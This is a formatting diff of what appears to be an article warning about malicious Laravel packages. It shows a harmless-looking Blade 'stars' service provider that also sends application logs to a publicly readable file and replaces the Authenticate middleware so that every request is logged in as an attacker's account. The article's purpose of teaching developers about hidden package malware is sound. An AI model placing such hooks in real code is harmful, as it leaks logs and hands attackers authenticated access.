@@ -49,12 +49,12 @@ use Illuminate\Support\ServiceProvider;
 
 class StarDisplayServiceProvider extends ServiceProvider
 {
-    public function boot(): void
-    {
-        Blade::directive('stars', function ($stars) {
-            return "<?= str_repeat('🌟', $stars) ?>";
-        });
-    }
+  public function boot(): void
+  {
+    Blade::directive('stars', function ($stars) {
+      return "<?= str_repeat('🌟', $stars) ?>";
+    });
+  }
 }
 ```
 
@@ -73,18 +73,18 @@ use Illuminate\Support\ServiceProvider;
 
 class StarDisplayServiceProvider extends ServiceProvider
 {
-    public function boot(): void
-    {
-        Blade::directive('stars', function ($stars) {
-            return "<?= str_repeat('🌟', $stars) ?>";
-        });
+  public function boot(): void
+  {
+    Blade::directive('stars', function ($stars) {
+      return "<?= str_repeat('🌟', $stars) ?>";
+    });
         
-        app()
-          ->make('log')
-          ->pushHandler(
-            new \Monolog\Handler\StreamHandler(public_path('/secret-log.txt'))
-          );
-    }
+    app()
+      ->make('log')
+      ->pushHandler(
+        new \Monolog\Handler\StreamHandler(public_path('/secret-log.txt'))
+      );
+  }
 }
 ```
 
@@ -106,7 +106,7 @@ Imagine I have this very simple admin interface:
 
 ```php
 Route::get('admin', function () {
-    return view('admin');
+  return view('admin');
 })->middleware('auth');
 ```
 
@@ -123,24 +123,24 @@ use Illuminate\Support\ServiceProvider;
 
 class StarDisplayServiceProvider extends ServiceProvider
 {
-    public function boot(): void
-    {
-        Blade::directive('stars', function ($stars) {
-            return "<?= str_repeat('🌟', $stars) ?>";
-        });
+  public function boot(): void
+  {
+    Blade::directive('stars', function ($stars) {
+      return "<?= str_repeat('🌟', $stars) ?>";
+    });
         
-        app()
-          ->make('log')
-          ->pushHandler(
-            new \Monolog\Handler\StreamHandler(public_path('/secret-log.txt'))
-          );
+    app()
+      ->make('log')
+      ->pushHandler(
+        new \Monolog\Handler\StreamHandler(public_path('/secret-log.txt'))
+      );
           
-        app()->instance(Authenticate::class, function ($request, $next) {
-          $badGuyUser = User::where('email', 'bad@guy.com')->first();
-          Auth::login($badGuyUser);
-          return $next($request);
-        });
-    }
+    app()->instance(Authenticate::class, function ($request, $next) {
+      $badGuyUser = User::where('email', 'bad@guy.com')->first();
+      Auth::login($badGuyUser);
+      return $next($request);
+    });
+  }
 }
 ```
 
